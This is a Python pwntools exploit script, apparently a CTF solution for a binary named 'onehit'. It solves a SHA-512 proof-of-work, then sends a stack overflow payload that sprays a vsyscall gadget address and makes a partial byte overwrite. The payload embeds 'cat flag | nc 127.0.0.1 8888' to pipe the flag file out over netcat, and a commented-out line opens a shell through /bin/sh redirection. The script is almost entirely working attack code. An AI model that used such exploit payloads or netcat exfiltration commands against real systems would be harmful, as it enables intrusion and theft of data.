from pwn import *
from hashlib import sha512
context.log_level = 'debug'

p = process("./onehit.",env = {"LD_PRELOAD" : './libc-2.27.so'})
p.recvuntil("sha512(\"")
head = p.recvuntil("\"", drop = True)
p.recvuntil(") = 0x")
check = p.recvuntil("...", drop = True)
interger = 0
for i in range(0, 0x1fffff)[::-1]:
    if sha512(head + str(i)).hexdigest().startswith(check):
        print i
        interger = i
        break
p.recvuntil('interger = ')
p.send(str(interger).ljust(0x100,'\x11'))
#gdb.attach(p)
p.recvuntil('ls -al?\n')
p.send('N0\x00')

p.recvuntil('/bin/sh\n')
p.send('1')
gdb.attach(p)
p.recvuntil('available\n')
payload = 'a'*(0x7f+0x10)
payload += 'cat flag | nc 127.0.0.1 8888\x00' #cat flag
#payload += '/bin/sh <&2 >&2 ;' #get shell
payload = payload.ljust(0xe8,'a')
payload += p64(0xffffffffff600400)*20
payload += '\x3a'
p.send(payload)

p.interactive()